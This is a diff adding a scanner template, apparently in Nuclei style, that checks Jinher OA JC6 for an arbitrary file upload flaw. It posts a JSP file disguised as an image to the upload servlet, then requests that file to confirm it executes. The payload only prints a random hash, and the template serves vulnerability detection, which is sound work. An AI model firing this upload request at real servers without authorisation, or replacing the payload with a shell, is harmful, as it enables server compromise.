@@ -1,0 +1,63 @@
+id: poc-yaml-jinher-oa-jc6-upload-anyfile-upload
+info:
+  name: Jinher OA JC6 Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "/jc6/servlet/Upload?officeSaveFlag=0&dbimg=false&path=&setpath=/upload/"
+    headers:
+      Content-Type: multipart/form-data; boundary=74f0dc3df975274386a11be68cacc0e5
+    body: |-
+      --74f0dc3df975274386a11be68cacc0e5
+      Content-Disposition: form-data; name="img"; filename="{{t1}}.jsp"
+      Content-Type: image/png
+
+      <% out.println("{{t2}}");%>
+      --74f0dc3df975274386a11be68cacc0e5--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "/upload"
+    extractors:
+      - type: regex
+        name: file
+        part: body
+        internal: true
+        regex:
+          - "(?m)[^/]+(/upload/.*).jsp"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "/jc6/{{file}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
